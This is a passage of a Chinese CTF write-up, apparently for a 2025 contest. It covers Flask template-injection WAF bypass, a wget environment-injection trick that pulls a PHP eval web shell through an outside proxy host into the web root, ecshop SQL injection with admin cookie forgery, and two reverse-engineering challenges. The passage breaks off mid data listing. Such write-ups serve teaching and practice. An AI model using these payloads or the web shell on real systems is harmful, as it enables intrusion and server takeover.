<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/fetch?url=http://vps_ip:<span class="number">8000</span>/<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>可以获取到secret</p>
<p>接下来是绕过waf, 题目把config ban了, 不能直接往config中存对象来缩小paylaod长度</p>
<p>注意到</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">app.jinja_env.<span class="built_in">globals</span>.update(sget=sget)</span><br><span class="line">app.jinja_env.<span class="built_in">globals</span>.update(sset=sset)</span><br></pre></td></tr></table></figure>

<p>题目把sset和sget注册到了app.jinja_env.globals中, 这使得我们可以在payload中直接使用这两个函数, 并且可以通过类似<code>sset.__globals__</code>拿到它的__globals__</p>
<p>并且题目有一个read函数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">f</span>): <span class="keyword">return</span> <span class="built_in">open</span>(f).read()</span><br></pre></td></tr></table></figure>

<p><img src="../images/2025-QWNT/4.png" alt="img"></p>
<p>我们可以从<code>sset.__globals__</code>直接获取到, 并且也可以直接使用sset把某些字符串存进session</p>
<p>最终构造出以下payload</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">print</span>(sset(<span class="string">&#x27;g&#x27;</span>,request.args.a)) %&#125;&amp;a=__globals__</span><br><span class="line">&#123;% <span class="built_in">print</span>(sset(<span class="string">&#x27;f&#x27;</span>,request.args.a)) %&#125;&amp;a=/flag</span><br><span class="line">&#123;%<span class="built_in">print</span>(sset[sget(<span class="string">&#x27;g&#x27;</span>)][<span class="string">&#x27;rea&#x27;</span><span class="string">&#x27;d&#x27;</span>](sget(<span class="string">&#x27;f&#x27;</span>)))%&#125;</span><br></pre></td></tr></table></figure>

<p>分三次执行即可</p>
<h2><span id="smallcode">smallcode</span><a href="#smallcode" class="header-anchor"></a></h2><p>参考：<a href="https://yenannn.github.io/2022/05/30/startctf%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5%E7%9A%84%E6%94%B9%E7%BC%96/">startctf环境变量注入的改编</a></p>
<p>原题直接，wp照着复现一遍</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http_proxy=156.238.233.111:5566</span><br><span class="line">output_document=/var/www/html/shell.php</span><br></pre></td></tr></table></figure>

<p>简单编码一下内容</p>
<p>context&#x3D;aHR0cF9wcm94eT0xNTYuMjM4LjIzMy4xMTE6NTU2Ng0Kb3V0cHV0X2RvY3VtZW50PS92YXIvd3d3L2h0bWwvc2hlbGwucGhw</p>
<p>访问&#x2F;1.txt确认是否正常输入</p>
<p>vps起一个内容</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo();@<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;orange&#x27;</span>]);?&gt;</span><br></pre></td></tr></table></figure>

<p>起一个python</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, make_response</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;1.txt&#x27;</span>) <span class="keyword">as</span> f: </span><br><span class="line">        r = f.read()</span><br><span class="line">        response = make_response(r)</span><br><span class="line">        response.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;text/plain&#x27;</span></span><br><span class="line">        response.headers[<span class="string">&#x27;Content-Disposition&#x27;</span>] = <span class="string">&#x27;attachment; filename=1.txt&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5566</span>)</span><br></pre></td></tr></table></figure>

<p>这时候输入</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">env</span>=WGETRC=/var/www/html/1.txt</span><br></pre></td></tr></table></figure>

<p><img src="../images/2025-QWNT/5.png" alt="img"></p>
<p><img src="../images/2025-QWNT/6.png" alt="img"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 -<span class="built_in">type</span> f -<span class="built_in">exec</span> <span class="built_in">ls</span> -la &#123;&#125; 2&gt;/dev/null \;</span><br></pre></td></tr></table></figure>

<p><img src="../images/2025-QWNT/7.png" alt="img"></p>
<h2><span id="ecshop">ecshop</span><a href="#ecshop" class="header-anchor"></a></h2><p>全局开启了转义, 并且有正则的waf</p>
<p><img src="../images/2025-QWNT/8.png" alt="img"></p>
<p>对以上全局变量使用了以下正则过滤</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$args_arr<span class="operator">=</span><span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;xss&#x27;</span><span class="operator">=</span><span class="operator">&gt;</span>&quot;[\\&#x27;\\\&quot;\\;\\<span class="operator">*</span>\\<span class="operator">&lt;</span>\\<span class="operator">&gt;</span>].<span class="operator">*</span>\\bon[a<span class="operator">-</span>zA<span class="operator">-</span>Z]&#123;<span class="number">3</span>,<span class="number">15</span>&#125;[\\s\\r\\n\\v\\f]<span class="operator">*</span>\\<span class="operator">=</span><span class="operator">|</span>\\b(?:expression)\\(<span class="operator">|</span>\\<span class="operator">&lt;</span>script[\\s\\\\\\<span class="operator">/</span>]<span class="operator">|</span>\\b(?:eval<span class="operator">|</span>alert<span class="operator">|</span>prompt<span class="operator">|</span>msgbox)\\s<span class="operator">*</span>\\(<span class="operator">|</span>url\\((?:\\#<span class="operator">|</span>data<span class="operator">|</span>javascript)&quot;,</span><br><span class="line">&#x27;sql&#x27;=&gt;&quot;(EXTRACTVALUE<span class="operator">|</span><span class="keyword">EXISTS</span><span class="operator">|</span>UPDATEXML)\\b.<span class="operator">+</span>?(<span class="keyword">select</span><span class="operator">|</span>concat)<span class="operator">|</span>[<span class="operator">^</span>\\&#123;\\s]&#123;<span class="number">1</span>&#125;(\\s<span class="operator">|</span>\\b)<span class="operator">+</span>(?:<span class="keyword">select</span>\\b<span class="operator">|</span><span class="keyword">update</span>\\b<span class="operator">|</span><span class="keyword">insert</span>(?:(\\<span class="operator">/</span>\\<span class="operator">*</span>.<span class="operator">*</span>?\\<span class="operator">*</span>\\<span class="operator">/</span>)<span class="operator">|</span>(\\s)<span class="operator">|</span>(\\<span class="operator">+</span>))<span class="operator">+</span><span class="keyword">into</span>\\b).<span class="operator">+</span>?(?:<span class="keyword">from</span>\\b<span class="operator">|</span><span class="keyword">set</span>\\b)<span class="operator">|</span>[<span class="operator">^</span>\\&#123;\\s]&#123;<span class="number">1</span>&#125;(\\s<span class="operator">|</span>\\b)<span class="operator">+</span>(?:<span class="keyword">create</span><span class="operator">|</span><span class="keyword">delete</span><span class="operator">|</span><span class="keyword">drop</span><span class="operator">|</span><span class="keyword">truncate</span><span class="operator">|</span>rename<span class="operator">|</span><span class="keyword">desc</span>)(?:(\\<span class="operator">/</span>\\<span class="operator">*</span>.<span class="operator">*</span>?\\<span class="operator">*</span>\\<span class="operator">/</span>)<span class="operator">|</span>(\\s)<span class="operator">|</span>(\\<span class="operator">+</span>))<span class="operator">+</span>(?:<span class="keyword">table</span>\\b<span class="operator">|</span><span class="keyword">from</span>\\b<span class="operator">|</span>database\\b)<span class="operator">|</span><span class="keyword">into</span>(?:(\\<span class="operator">/</span>\\<span class="operator">*</span>.<span class="operator">*</span>?\\<span class="operator">*</span>\\<span class="operator">/</span>)<span class="operator">|</span>\\s<span class="operator">|</span>\\<span class="operator">+</span>)<span class="operator">+</span>(?:dump<span class="operator">|</span><span class="keyword">out</span>)file\\b<span class="operator">|</span>\\bsleep\\([\\s]<span class="operator">*</span>[\\d]<span class="operator">+</span>[\\s]<span class="operator">*</span>\\)<span class="operator">|</span>benchmark\\(([<span class="operator">^</span>\\,]<span class="operator">*</span>)\\,([<span class="operator">^</span>\\,]<span class="operator">*</span>)\\)<span class="operator">|</span>(?:<span class="keyword">declare</span><span class="operator">|</span><span class="keyword">set</span><span class="operator">|</span><span class="keyword">select</span>)\\b.<span class="operator">*</span>@<span class="operator">|</span><span class="keyword">union</span>\\b.<span class="operator">*</span>(?:<span class="keyword">select</span><span class="operator">|</span><span class="keyword">all</span>)\\b<span class="operator">|</span>(?:<span class="keyword">select</span><span class="operator">|</span><span class="keyword">update</span><span class="operator">|</span><span class="keyword">insert</span><span class="operator">|</span><span class="keyword">create</span><span class="operator">|</span><span class="keyword">delete</span><span class="operator">|</span><span class="keyword">drop</span><span class="operator">|</span><span class="keyword">grant</span><span class="operator">|</span><span class="keyword">truncate</span><span class="operator">|</span>rename<span class="operator">|</span><span class="keyword">exec</span><span class="operator">|</span><span class="keyword">desc</span><span class="operator">|</span><span class="keyword">from</span><span class="operator">|</span><span class="keyword">table</span><span class="operator">|</span>database<span class="operator">|</span><span class="keyword">set</span><span class="operator">|</span><span class="keyword">where</span>)\\b.<span class="operator">*</span>(charset<span class="operator">|</span>ascii<span class="operator">|</span>bin<span class="operator">|</span><span class="type">char</span><span class="operator">|</span>uncompress<span class="operator">|</span>concat<span class="operator">|</span>concat_ws<span class="operator">|</span>conv<span class="operator">|</span>export_set<span class="operator">|</span>hex<span class="operator">|</span>instr<span class="operator">|</span><span class="keyword">left</span><span class="operator">|</span>load_file<span class="operator">|</span>locate<span class="operator">|</span>mid<span class="operator">|</span>sub<span class="operator">|</span>substring<span class="operator">|</span>oct<span class="operator">|</span>reverse<span class="operator">|</span><span class="keyword">right</span><span class="operator">|</span>unhex)\\(<span class="operator">|</span>(?:master\\.\\.sysdatabases<span class="operator">|</span>msysaccessobjects<span class="operator">|</span>msysqueries<span class="operator">|</span>sysmodules<span class="operator">|</span>mysql\\.db<span class="operator">|</span>sys\\.database_name<span class="operator">|</span>information_schema\\.<span class="operator">|</span>sysobjects<span class="operator">|</span>sp_makewebtask<span class="operator">|</span>xp_cmdshell<span class="operator">|</span>sp_oamethod<span class="operator">|</span>sp_addextendedproc<span class="operator">|</span>sp_oacreate<span class="operator">|</span>xp_regread<span class="operator">|</span>sys\\.dbms_export_extension)&quot;,</span><br><span class="line">&#x27;other&#x27;=&gt;&quot;\\.\\.[\\\\\\<span class="operator">/</span>].<span class="operator">*</span>\\<span class="operator">%</span><span class="number">00</span>([<span class="operator">^</span><span class="number">0</span><span class="number">-9</span>a<span class="operator">-</span>fA<span class="operator">-</span>F]<span class="operator">|</span>$)<span class="operator">|</span><span class="operator">%</span><span class="number">00</span>[\\<span class="string">&#x27;\\\&quot;\\.]&quot;);</span></span><br></pre></td></tr></table></figure>

<p>漏洞点在user.php的ajax_validate_sms</p>
<p><img src="../images/2025-QWNT/9.png" alt="img"></p>
<p>虽然全局有转义, 但是这里的json_decode会将其中的转义字符还原, 导致绕过</p>
<p>可以看见还原出来的字符串已经不带转义字符</p>
<p><img src="../images/2025-QWNT/10.png" alt="img"></p>
<p>并且对于报错注入的正则并不严谨, 可绕过</p>
<p><img src="../images/2025-QWNT/11.png" alt="img"></p>
<p><img src="../images/2025-QWNT/12.png" alt="1"></p>
<p>现在我们可以尝试构造读取admin密码</p>
<p><img src="../images/2025-QWNT/13.png" alt="1"></p>
<p>报错注入具有长度限制, 拼接后密码hash如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">421add03e05a9f5060f1234a6106a8ee</span><br></pre></td></tr></table></figure>

<p>这里hash是爆不出来的</p>
<p>寻找管理员身份验证逻辑, 可以看见有以下认证方式</p>
<p><img src="../images/2025-QWNT/14.png" alt="img"></p>
<p><img src="../images/2025-QWNT/15.png" alt="15"></p>
<p><img src="../images/2025-QWNT/16.png" alt="img"></p>
<p>之后伪造cookie即可</p>
<p><img src="../images/2025-QWNT/17.png" alt="img"></p>
<p>成功伪造并登录admin账户 !</p>
<p>项目使用了smarty模板引擎</p>
<p>此处可添加模板, 读取flag, 参考<a href="https://www.anquanke.com/post/id/272393">https://www.anquanke.com/post/id/272393</a></p>
<p><img src="../images/2025-QWNT/18.png" alt="img"></p>
<p>访问根目录获取flag</p>
<p><img src="../images/2025-QWNT/19.png" alt="img"></p>
<h1><span id="reverse">Reverse</span><a href="#reverse" class="header-anchor"></a></h1><h2><span id="hyperjump">HyperJump</span><a href="#hyperjump" class="header-anchor"></a></h2><p>Vm逻辑太复杂不想看，发现函数是单字节加密（每次比较一个字节），因此直接pintool爆破了，因为错误会提前退出，导致指令执行数目大大减少</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">FLAG_LEN = <span class="number">24</span>                 <span class="comment"># 标志长度</span></span><br><span class="line">CHARSET = string.ascii_lowercase+string.digits+<span class="string">&quot;_@&#123;&#125;&quot;</span>  <span class="comment"># 爆破字符集 (a-zA-Z)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置 pwntools 上下文</span></span><br><span class="line">context.log_level = <span class="string">&#x27;info&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_inscount</span>(<span class="params">payload</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    运行 pin 并返回指令数。</span></span><br><span class="line"><span class="string">    每次猜测都必须启动一个新进程。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(payload, <span class="built_in">str</span>):</span><br><span class="line">        payload = payload.encode()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 启动进程</span></span><br><span class="line">        <span class="comment"># 注意：Pin 可能会将指令数输出到 stderr</span></span><br><span class="line">        p = process([<span class="string">&quot;./pin -t inscount0_cout.so -- ./hyperjump&quot;</span>], shell=<span class="literal">True</span>)</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;Provide the flag:\n&#x27;</span>)</span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        </span><br><span class="line">        out = p.recvall(timeout=<span class="number">100</span>)</span><br><span class="line">        <span class="built_in">print</span>(out.decode())</span><br><span class="line">        </span><br><span class="line">        p.close()</span><br><span class="line">        lines = out.decode().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">reversed</span>(lines):</span><br><span class="line">            <span class="keyword">if</span> line.isdigit():</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">int</span>(line)</span><br><span class="line">        </span><br><span class="line">        log.warning(<span class="string">f&quot;无法从 &#x27;<span class="subst">&#123;pin_output&#125;</span>&#x27; 中解析出指令数&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        log.error(<span class="string">f&quot;执行 payload <span class="subst">&#123;payload&#125;</span> 时出错: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --- 爆破主循环 ---</span></span><br><span class="line">known_flag = <span class="built_in">list</span>(<span class="string">&quot;flag&#123;m4z3d_vm_jump&quot;</span>)+<span class="built_in">list</span>(<span class="string">&quot;A&quot;</span> * (FLAG_LEN-<span class="number">18</span>)) <span class="comment"># 从 &quot;AAAA...&quot; 开始</span></span><br><span class="line">log.info(<span class="string">f&quot;开始爆破 <span class="subst">&#123;BINARY_PATH&#125;</span>，长度 <span class="subst">&#123;FLAG_LEN&#125;</span>，字符集 <span class="subst">&#123;CHARSET&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>, FLAG_LEN):</span><br><span class="line">    log.info(<span class="string">f&quot;正在爆破第 <span class="subst">&#123;i&#125;</span> 位...&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    max_count = <span class="number">0</span></span><br><span class="line">    best_char = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 遍历所有可能的字符</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> CHARSET:</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 构造测试 payload</span></span><br><span class="line">        current_test = <span class="built_in">list</span>(known_flag)</span><br><span class="line">        current_test[i] = char</span><br><span class="line">        payload = <span class="string">&quot;&quot;</span>.join(current_test)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 获取指令数</span></span><br><span class="line">        count = get_inscount(payload)</span><br><span class="line">        <span class="built_in">print</span>(count)</span><br><span class="line">        <span class="keyword">if</span> count == <span class="number">0</span>:</span><br><span class="line">            log.warning(<span class="string">f&quot;字符 &#x27;<span class="subst">&#123;char&#125;</span>&#x27; 获取计数失败，跳过...&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 调试信息</span></span><br><span class="line">        <span class="comment"># log.debug(f&quot;测试: &#123;payload&#125; -&gt; &#123;count&#125; 条指令&quot;)</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 更新最大值</span></span><br><span class="line">        <span class="keyword">if</span> count &gt; max_count:</span><br><span class="line">            max_count = count</span><br><span class="line">            best_char = char</span><br><span class="line">            log.info(<span class="string">f&quot;发现新的最大值: 字符 &#x27;<span class="subst">&#123;best_char&#125;</span>&#x27; -&gt; <span class="subst">&#123;max_count&#125;</span> 条指令&quot;</span>)</span><br><span class="line">            </span><br><span class="line">    <span class="keyword">if</span> best_char:</span><br><span class="line">        known_flag[i] = best_char</span><br><span class="line">        log.success(<span class="string">f&quot;第 <span class="subst">&#123;i&#125;</span> 位确定为: &#x27;<span class="subst">&#123;best_char&#125;</span>&#x27;&quot;</span>)</span><br><span class="line">        log.success(<span class="string">f&quot;当前 Flag: <span class="subst">&#123;<span class="string">&#x27;&#x27;</span>.join(known_flag)&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        log.error(<span class="string">f&quot;第 <span class="subst">&#123;i&#125;</span> 位爆破失败，所有字符返回 0？&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">f&quot;--- 爆破完成 ---&quot;</span>)</span><br><span class="line">log.success(<span class="string">f&quot;最终 Flag: <span class="subst">&#123;<span class="string">&#x27;&#x27;</span>.join(known_flag)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>得到flag{m4z3d_vm_jump5__42}</p>
<h2><span id="icall">Icall</span><a href="#icall" class="header-anchor"></a></h2><p>地址混淆+控制流平坦化，不会还原只能上动调</p>
<p>首先init里出现了pthread_create创建新线程导致调试器附加失败（反调），因此直接跳过pthread_create的调用（IDA来set ip），接着跳过exit的调用</p>
<p><img src="../images/2025-QWNT/20.png" alt="img"></p>
<p><img src="../images/2025-QWNT/21.png" alt="img"></p>
<p>接着就可以F9来到main一点点调试，首先关注到解密出来了一个字符串”arf@gocrying”</p>
<p><img src="../images/2025-QWNT/22.png" alt="img"></p>
<p>然后输入字符串</p>
<p><img src="../images/2025-QWNT/23.png" alt="img"></p>
<p>然后循环做了放射处理</p>
<p><img src="../images/2025-QWNT/24.png" alt="img"></p>
<p>接着就是RC4，观察到了init和异或，同时该流程调用了三次</p>
<p><img src="../images/2025-QWNT/25.png" alt="img"></p>
<p><img src="../images/2025-QWNT/26.png" alt="img"></p>
<p>由于一直没复现出来，所以直接下条件断点提取异或值</p>
<p><img src="../images/2025-QWNT/27.png" alt="img"></p>
<p>提取出来异或的v10（keystream，正好是90个，也就是每次加密30个字符）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&quot;&quot;&quot;108 91</span></span><br><span class="line"><span class="string">55 205</span></span><br><span class="line"><span class="string">108 85</span></span><br><span class="line"><span class="string">57 250</span></span><br><span class="line"><span class="string">108 68</span></span><br><span class="line"><span class="string">40 195</span></span><br><span class="line"><span class="string">108 198</span></span><br><span class="line"><span class="string">170 235</span></span><br><span class="line"><span class="string">108 116</span></span><br><span class="line"><span class="string">24 65</span></span><br><span class="line"><span class="string">108 3</span></span><br><span class="line"><span class="string">111 89</span></span><br><span class="line"><span class="string">108 111</span></span><br><span class="line"><span class="string">3 54</span></span><br><span class="line"><span class="string">108 163</span></span><br><span class="line"><span class="string">207 53</span></span><br><span class="line"><span class="string">108 178</span></span><br><span class="line"><span class="string">222 250</span></span><br><span class="line"><span class="string">108 0</span></span><br><span class="line"><span class="string">108 36</span></span><br><span class="line"><span class="string">108 48</span></span><br><span class="line"><span class="string">92 72</span></span><br><span class="line"><span class="string">108 229</span></span><br><span class="line"><span class="string">137 20</span></span><br><span class="line"><span class="string">108 113</span></span><br><span class="line"><span class="string">29 157</span></span><br><span class="line"><span class="string">108 126</span></span><br><span class="line"><span class="string">18 128</span></span><br><span class="line"><span class="string">108 37</span></span><br><span class="line"><span class="string">73 146</span></span><br><span class="line"><span class="string">108 50</span></span><br><span class="line"><span class="string">94 219</span></span><br><span class="line"><span class="string">108 90</span></span><br><span class="line"><span class="string">54 133</span></span><br><span class="line"><span class="string">108 70</span></span><br><span class="line"><span class="string">42 179</span></span><br><span class="line"><span class="string">108 49</span></span><br><span class="line"><span class="string">93 153</span></span><br><span class="line"><span class="string">108 237</span></span><br><span class="line"><span class="string">129 196</span></span><br><span class="line"><span class="string">108 106</span></span><br><span class="line"><span class="string">6 69</span></span><br><span class="line"><span class="string">108 31</span></span><br><span class="line"><span class="string">115 67</span></span><br><span class="line"><span class="string">108 210</span></span><br><span class="line"><span class="string">190 48</span></span><br><span class="line"><span class="string">108 213</span></span><br><span 